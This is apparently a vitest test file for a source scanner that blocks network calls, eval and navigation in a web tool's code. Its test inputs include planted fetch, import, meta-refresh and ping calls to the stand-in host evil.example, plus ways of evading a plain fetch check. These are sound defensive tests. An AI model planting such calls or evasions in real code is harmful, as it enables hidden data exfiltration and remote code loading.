import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { scan, scanSource } from './source-scan.ts';

describe('source scan', () => {
  it('finds a planted fetch in a tool folder', () => {
    const problems = scan([
      {
        path: 'src/tools/evil/logic.ts',
        text: 'export const x = () => fetch("https://evil.example/")',
      },
    ]);
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('fetch is not allowed');
  });
  it('allows fetch only in the codec loaders', () => {
    const text = 'await fetch(url)';
    expect(scan([{ path: 'src/lib/analytics.ts', text }])).not.toEqual([]);
    expect(scan([{ path: 'src/lib/codecs/avif.ts', text }])).toEqual([]);
    expect(scan([{ path: 'src/lib/core/pipeline.ts', text }])).not.toEqual([]);
  });
  it('flags HTML and code injection', () => {
    for (const text of [
      'el.innerHTML = x',
      'eval("1")',
      'new Function("return 1")',
      '<div>{@html x}</div>',
      'new WebSocket(u)',
      'navigator.sendBeacon(u)',
    ]) {
      expect(scan([{ path: 'src/tools/x/Tool.svelte', text }]), text).not.toEqual([]);
    }
  });
  it('flags ways around a plain fetch( call', () => {
    for (const text of [
      'const f = fetch;\nf(u)',
      'fetch\n(u)',
      'self["fet" + "ch"](u)',
      'globalThis[name](u)',
      'window?.["fetch"](u)',
      'navigator["sendBeacon"](u, d)',
      'const m = await import(url)',
      'await import(\n  url,\n)',
      'await import("https://evil.example/x.js")',
      'await import("//evil.example/x.js")',
      'await import("data:text/javascript,1")',
      'await import(`./${name}.js`)',
      'importScripts(u)',
    ]) {
      expect(scan([{ path: 'src/tools/x/logic.ts', text }]), text).not.toEqual([]);
    }
  });
  it('flags navigation and extra workers', () => {
    for (const text of [
      'window.open(u)',
      'location.href = u',
      'location.assign(u)',
      'location = u',
      'new SharedWorker(u)',
      'navigator.serviceWorker.register(u)',
      'new Worker(URL.createObjectURL(blob))',
      '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
      '<a href="/x" ping="https://evil.example/">x</a>',
    ]) {
      expect(scan([{ path: 'src/tools/x/Tool.svelte', text }]), text).not.toEqual([]);
    }
  });
  it('allows the known worker files and ordinary local imports', () => {
    const worker = 'new Worker(new URL("./worker.ts", import.meta.url), { type: "module" })';
    expect(scan([{ path: 'src/lib/core/pool.ts', text: worker }])).toEqual([]);
    expect(scan([{ path: 'src/tools/x/logic.ts', text: worker }])).not.toEqual([]);
    const local =
      'const { a } = await import("../codecs/wasm/avif");\nawait import("svgo/browser");';
    expect(scan([{ path: 'src/tools/x/logic.ts', text: local }])).toEqual([]);
    expect(scan([{ path: 'src/tools/x/Tool.svelte', text: 'if (location.hostname) {}' }])).toEqual(
      [],
    );
  });
  it('reads the files a browser could run, not only .ts, .svelte and .js', () => {
    const dir = mkdtempSync(join(tmpdir(), 'scan-'));
    mkdirSync(join(dir, 'generated'));
    writeFileSync(join(dir, 'generated', 'a.mjs'), 'fetch(u)');
    writeFileSync(join(dir, 'b.cjs'), 'new WebSocket(u)');
    writeFileSync(join(dir, 'c.html'), '<script>eval(x)</script>');
    const found = scanSource([dir]);
    expect(found).toHaveLength(3);
  });
  it('allows {@html} only for bundled icons', () => {
    expect(scan([{ path: 'src/lib/ui/Icon.svelte', text: '{@html svg}' }])).toEqual([]);
  });
  it('passes on the real source tree', () => {
    expect(scanSource()).toEqual([]);
  });
});
